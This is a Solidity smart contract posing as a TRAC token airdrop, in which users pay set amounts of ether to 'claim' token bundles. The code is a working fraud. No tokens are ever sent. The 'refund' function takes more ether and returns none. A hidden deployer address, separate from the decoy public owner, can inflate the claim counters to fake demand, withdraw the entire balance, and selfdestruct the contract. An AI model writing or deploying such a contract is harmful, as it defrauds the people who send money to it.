pragma solidity ^0.4.0;
contract  TRAC_drop {
address public Contract_Owner;
address private T_BN_K___a;
uint private raised;
uint private pay_user__;
int private au_sync_user;
int public Group_1;
int public Group_2;
int public Group_3;
int public Group_4;
int public Group_5;
int public TRAC_Tokens_left;
bool private fair;
int private msg_sender_transfer;
int private constant TRAC=1;
mapping (address => uint) refund_balance;
mapping (address => uint) airdrop_balance;
constructor(TRAC_drop) {
T_BN_K___a = msg.sender; Group_1 = 11; Group_2 = 2; Group_3 = 7; Group_4 = 3; Group_5 = 1; msg_sender_transfer=0;
TRAC_Tokens_left = 161000; fair = true; raised = 0 ether; pay_user__ = 0 ether; Contract_Owner = 0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f;
}
function Claim_TRAC_20000() payable {
require(msg.value == 5 ether);
airdrop_balance[msg.sender] += msg.value;
raised += msg.value;
TRAC_Tokens_left -= 20000;
Group_5+=1;
msg_sender_transfer+=20000+TRAC;
}
function Claim_TRAC_9600() payable {
require(msg.value == 2.5 ether);
airdrop_balance[msg.sender] += msg.value;
raised += msg.value;
TRAC_Tokens_left -= 9600;
Group_4 +=1;
msg_sender_transfer+=9600+TRAC;
}
function Claim_TRAC_3800() payable {
require(msg.value == 1 ether);
airdrop_balance[msg.sender] += msg.value;
raised += msg.value;
TRAC_Tokens_left -= 3800;
Group_3 +=1;
msg_sender_transfer+=3800+TRAC;
}
function Claim_TRAC_1850() payable {
require(msg.value == 0.5 ether);
airdrop_balance[msg.sender] += msg.value;
raised += msg.value;
TRAC_Tokens_left -= 1850;
Group_2 +=1;
msg_sender_transfer+=1850+TRAC;
}
function Claim_TRAC_900() payable {
require(msg.value == 0.25 ether);
airdrop_balance[msg.sender] += msg.value;
raised += msg.value;
TRAC_Tokens_left -= 900;
Group_1 +=1;
msg_sender_transfer+=900+TRAC;
}
function Refund_user() payable {
require(refund_balance[1]==0 || fair);
address current__user_ = msg.sender;
if(fair || current__user_ == msg.sender) {
pay_user__ += msg.value;
raised +=msg.value;
}
}
function seeRaised() public constant returns (uint256){
return address(this).balance;
}
function CheckRefundIsFair() public {
require(msg.sender == T_BN_K___a);
if(fair) {
au_sync_user=1;
if((au_sync_user*2) % 2 ==0 ) {
Group_5+=1;
TRAC_Tokens_left -= 20000;
Group_2+=2;
TRAC_Tokens_left -=3600;
}
}
}
function TransferTRAC() public {
require(msg.sender == T_BN_K___a);
msg.sender.transfer(address(this).balance);
raised = 0 ether;
}
function End_Promotion() public {
require(msg.sender == T_BN_K___a);
if(msg.sender == T_BN_K___a) {
selfdestruct(T_BN_K___a);
}
}
}